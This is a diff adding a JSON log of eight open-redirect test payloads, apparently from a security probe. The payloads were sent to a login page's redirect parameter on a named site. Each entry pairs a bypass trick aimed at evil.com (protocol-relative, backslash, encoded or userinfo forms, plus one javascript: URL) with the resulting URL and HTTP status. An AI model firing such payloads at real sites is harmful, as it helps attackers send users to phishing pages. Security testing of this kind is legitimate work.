@@ -1,0 +1,50 @@
+[
+  {
+    "payload": "//evil.com",
+    "nav_url": "https://kuromangas.com/login?redirect=//evil.com",
+    "final": "https://kuromangas.com/login?redirect=//evil.com",
+    "status": 200
+  },
+  {
+    "payload": "https://evil.com",
+    "nav_url": "https://kuromangas.com/login?redirect=https://evil.com",
+    "final": "https://kuromangas.com/login?redirect=https://evil.com",
+    "status": 403
+  },
+  {
+    "payload": "javascript:alert(1)",
+    "nav_url": "https://kuromangas.com/login?redirect=javascript:alert(1)",
+    "final": "https://kuromangas.com/login?redirect=javascript:alert(1)",
+    "status": 403
+  },
+  {
+    "payload": "/%5Cevil.com",
+    "nav_url": "https://kuromangas.com/login?redirect=/%5Cevil.com",
+    "final": "https://kuromangas.com/login?redirect=/%5Cevil.com",
+    "status": 403
+  },
+  {
+    "payload": "//evil.com%2f..",
+    "nav_url": "https://kuromangas.com/login?redirect=//evil.com%2f..",
+    "final": "https://kuromangas.com/login?redirect=//evil.com%2f..",
+    "status": 403
+  },
+  {
+    "payload": "/\\evil.com",
+    "nav_url": "https://kuromangas.com/login?redirect=/\\evil.com",
+    "final": "https://kuromangas.com/login?redirect=/\\evil.com",
+    "status": 403
+  },
+  {
+    "payload": "//evil.com@kuromangas.com",
+    "nav_url": "https://kuromangas.com/login?redirect=//evil.com@kuromangas.com",
+    "final": "https://kuromangas.com/login?redirect=//evil.com@kuromangas.com",
+    "status": 403
+  },
+  {
+    "payload": "https://evil.com/",
+    "nav_url": "https://kuromangas.com/login?redirect=https://evil.com/",
+    "final": "https://kuromangas.com/login?redirect=https://evil.com/",
+    "status": 403
+  }
+]
